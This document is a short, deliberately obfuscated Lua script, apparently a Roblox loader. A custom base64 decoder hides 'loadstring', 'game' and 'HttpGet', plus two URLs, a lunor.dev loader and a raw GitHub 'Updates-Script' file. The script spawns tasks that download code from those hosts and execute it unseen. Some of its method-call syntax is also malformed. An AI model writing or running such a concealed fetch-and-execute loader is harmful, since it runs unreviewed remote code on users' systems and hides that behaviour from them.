local Rl="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function Xn(J)local d=J:gsub('[^'..Rl..'=]','')return(d:gsub('.',function(x)if x=='='then return''end;local r,f='',(Rl:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end;return r;end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end;local c=0;for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end;return string.char(c)end))end

local Kq={Xn("dGFzaw=="),Xn("c3Bhd24="),Xn("bG9hZHN0cmluZw=="),Xn("Z2FtZQ=="),Xn("SHR0cEdldA==")}
local Vp={Xn("aHR0cHM6Ly9sdW5vci5kZXYvbG9hZGVy"),Xn("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VwZGF0ZXMtU2NyaXB0L1VwZGF0ZWQvcmVmcy9oZWFkcy9tYWluL1NjcmlwdC5sdWE=")}
(getfenv()[Kq[1]])[Kq[2]](function()getfenv()[Kq[3]]((getfenv()[Kq[4]]):[Kq[5]](Vp[1]))()end)
(getfenv()[Kq[1]])[Kq[2]](function()getfenv()[Kq[3]]((getfenv()[Kq[4]]):[Kq[5]](Vp[2]))()end)
